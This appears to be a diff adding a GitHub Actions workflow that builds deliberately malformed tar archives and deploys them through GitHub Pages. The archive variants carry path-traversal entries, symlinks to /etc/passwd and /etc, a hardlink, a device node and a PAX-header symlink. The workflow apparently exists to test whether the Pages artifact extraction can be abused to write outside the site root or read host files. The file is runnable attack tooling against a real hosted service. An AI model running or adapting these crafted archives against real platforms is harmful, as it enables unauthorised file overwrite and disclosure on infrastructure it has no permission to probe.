@@ -1,0 +1,58 @@
+name: pages-artifact-bisect
+on:
+  workflow_dispatch:
+    inputs:
+      variant:
+        description: 'variant'
+        required: true
+        default: 'traversal'
+        type: string
+permissions:
+  contents: read
+  pages: write
+  id-token: write
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment: github-pages
+    steps:
+      - name: build crafted tar
+        run: |
+          python3 -c "import tarfile, time, io, os
+          v = os.environ['VARIANT']
+          tag = v
+          t = tarfile.open('artifact.tar', 'w', format=tarfile.GNU_FORMAT)
+          def f(name, data, mode=0o644, typ=tarfile.REGTYPE):
+              ti = tarfile.TarInfo(name); ti.size = len(data); ti.mtime = int(time.time()); ti.mode = mode; ti.type = typ
+              t.addfile(ti, io.BytesIO(data)) if typ == tarfile.REGTYPE else t.addfile(ti)
+          def l(name, target):
+              ti = tarfile.TarInfo(name); ti.type = tarfile.SYMTYPE; ti.linkname = target; ti.mtime = int(time.time())
+              t.addfile(ti)
+          f('index.html', ('<h1>variant-' + tag + '</h1>').encode())
+          if v == 'traversal':
+              f('pwn/../../index.html', b'<h1>TRAVERSAL-OVERWRITE-ROOT</h1>')
+              f('../../../../../../tmp/trav-outside.html', b'TRAV-OUTSIDE')
+          elif v == 'symlink':
+              l('s.html', '/etc/passwd')
+          elif v == 'hardlink':
+              ti = tarfile.TarInfo('h.html'); ti.type = tarfile.LNKTYPE; ti.linkname = 'index.html'; ti.mtime = int(time.time()); t.addfile(ti)
+          elif v == 'symdir':
+              ti = tarfile.TarInfo('dlink'); ti.type = tarfile.SYMTYPE; ti.linkname = '/etc'; ti.mtime = int(time.time()); t.addfile(ti)
+              f('dlink/passwd', b'ignored')
+          elif v == 'devnull':
+              ti = tarfile.TarInfo('dn.html'); ti.type = tarfile.CHRTYPE; ti.devmajor = 1; ti.devminor = 3; ti.mode = 0o666; t.addfile(ti)
+          elif v == 'paxlink':
+              ti = tarfile.TarInfo('px.html'); ti.type = tarfile.SYMTYPE; ti.linkname = '/etc/passwd'; ti.mtime = int(time.time())
+              ti.pax_headers = {'linkpath': '/etc/passwd'}
+              t.addfile(ti)
+          t.close()
+          print('variant built:', v)"
+        env:
+          VARIANT: ${{ inputs.variant }}
+      - uses: actions/upload-artifact@v4
+        with:
+          name: github-pages
+          path: artifact.tar
+      - id: deploy
+        uses: actions/deploy-pages@v4
+      - run: echo "RESULT variant=${{ inputs.variant }} status=${{ steps.deploy.outputs.deployment-status }} url=${{ steps.deploy.outputs.page-url }}"
